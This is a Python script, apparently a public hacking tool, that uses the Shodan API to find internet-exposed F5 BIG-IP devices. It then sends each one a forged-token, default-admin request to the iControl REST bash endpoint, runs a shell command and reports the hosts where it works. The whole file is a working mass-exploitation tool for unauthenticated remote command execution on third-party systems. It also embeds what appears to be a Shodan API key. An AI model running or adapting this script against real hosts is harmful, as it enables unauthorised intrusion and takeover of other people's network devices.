from colorama import Fore
import shodan
import requests 
import json
import urllib3
import random


SHODAN_API_KEY = "B7p3tzMSEkfaZJslROkL9062PDsvdB0Z"
api = shodan.Shodan(SHODAN_API_KEY)

banner = """

███████╗ ██╗██╗   ██╗██████╗     ███████╗ ██████╗██╗  ██╗███╗   ██╗
██╔════╝███║██║   ██║╚════██╗    ██╔════╝██╔════╝██║  ██║████╗  ██║
█████╗  ╚██║██║   ██║ █████╔╝    ███████╗██║     ███████║██╔██╗ ██║
██╔══╝   ██║╚██╗ ██╔╝ ╚═══██╗    ╚════██║██║     ╚════██║██║╚██╗██║
██║      ██║ ╚████╔╝ ██████╔╝    ███████║╚██████╗     ██║██║ ╚████║
╚═╝      ╚═╝  ╚═══╝  ╚═════╝     ╚══════╝ ╚═════╝     ╚═╝╚═╝  ╚═══╝
                                                      by: c0deninja
"""

print(f"{Fore.CYAN}{banner}")

useragent_list = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36"
]


headers = {
    "User-Agent": random.choice(useragent_list),
    'Content-Type': 'application/json',
    'Connection': 'keep-alive, x-F5-Auth-Token',
    'X-F5-Auth-Token': 'abc',
    'Authorization': 'Basic YWRtaW46'
}
data = {'command': "run",'utilCmdArgs':"-c id"}
try:
    results = api.search('http.title:"BIG-IP&reg;-+Redirect" +"Server" product:"F5 BIG-IP"')
    ips = []
    for result in results['matches']:
        ips.append(result['ip_str'])
        with open("f5bigip.txt", "w") as f:
            for ip_address in ips:
                f.writelines(f"{ip_address}\n")
    with open("f5bigip.txt", "r") as get_ips:
        f5bigips_list = [x.strip() for x in get_ips.readlines()]
        for f5_list in f5bigips_list:
            try:
                response = requests.post(url=f"https://{f5_list}/mgmt/tm/util/bash", json=data, headers=headers, verify=False, timeout=5)
                if response.status_code == 200 and 'commandResult' in response.text:
                    default = json.loads(response.text)
                    display = default['commandResult']
                    print(f"{Fore.GREEN}VULNERABLE: {Fore.CYAN}https://{f5_list}")
                    print(f"{Fore.GREEN}RESULTS: {Fore.CYAN}{display}")
                else:
                    print(f"{Fore.RED}NOT VULNERABLE: https://{f5_list}")
            except requests.exceptions.SSLError:
                pass
            except urllib3.exceptions.MaxRetryError:
                pass
            except requests.exceptions.ConnectTimeout:
                pass
            except requests.exceptions.ReadTimeout:
                pass
except shodan.APIError as e:
        print('Error: {}'.format(e))